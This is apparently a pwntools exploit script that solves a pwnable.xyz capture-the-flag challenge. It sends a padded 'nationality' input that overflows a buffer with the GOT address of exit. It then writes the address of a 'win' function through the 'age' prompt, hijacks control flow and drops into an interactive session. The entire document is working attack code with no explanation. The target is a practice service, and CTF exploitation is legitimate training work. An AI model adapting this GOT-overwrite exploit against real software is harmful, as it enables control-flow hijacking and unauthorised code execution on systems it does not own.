#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
#p = process("./challenge")
p = remote("svc.pwnable.xyz", 30031)
elf = ELF("./challenge")
exit_got = elf.got['exit']

p.sendafter("> ", '2')
p.sendafter("nationality: ", 'A'*0x10 + p64(exit_got))

p.sendafter("> ", '3')
p.sendlineafter("age: ", str(elf.symbols['win']))

p.interactive()

